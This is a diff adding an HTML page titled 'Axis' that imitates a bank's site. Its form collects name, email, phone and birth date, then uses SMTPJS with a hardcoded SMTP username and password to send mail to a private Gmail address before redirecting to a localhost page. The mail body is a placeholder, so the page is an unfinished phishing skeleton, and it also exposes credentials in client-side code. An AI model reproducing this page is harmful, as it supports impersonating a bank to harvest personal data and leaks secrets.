@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis</title>
+    <link rel="stylesheet" href="contact.css">
+</head>
+<body>
+    <nav class="navbar-one flex">
+        <div class="left">
+        </div>
+        <ul class="first flex">
+            <li><a href="contact.html">Personal</a></li>
+            <li><a href="contact.html">Business</a></li>
+            <li><a href="contact.html">Priority</a></li>
+            <li><a href="contact.html">NRI</a></li>
+            <li><a href="contact.html">About Us</a></li>
+            <li><a href="contact.html">Support</a></li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <form onsubmit="sendEmail(); reset(); return false;">
+            <h3>Your Details</h3>
+        <input type="text" id="name" placeholder="Your Name" required>
+        <input type="text" id="email" placeholder="Email Id" required>
+        <input type="text" id="phone" placeholder="Phone No." required>
+        <input type="text" id="birth" placeholder="Birth Date" required>
+        <button id="btn" type="submit">Submit</button>
+        <script>
+            let my_url = "http://127.0.0.1:3000/info.html";
+            document.getElementById("btn").onclick=function(){
+                window.location.replace(my_url);
+            }
+        </script>
+    </form>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function sendEmail(){
+            Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "micle458975@gmail.com",
+    Password : "247B80170B475E938CCDDD3DCB0FF0F7AADD",
+    To : 'amanda458975@gmail.com',
+    From : "micle458975@gmail.com",
+    Subject : "Your details",
+    Body : "And this is the body"
+}).then(
+  message => alert(message)
+);
+
+        }
+    </script>
+</body>
+</html>
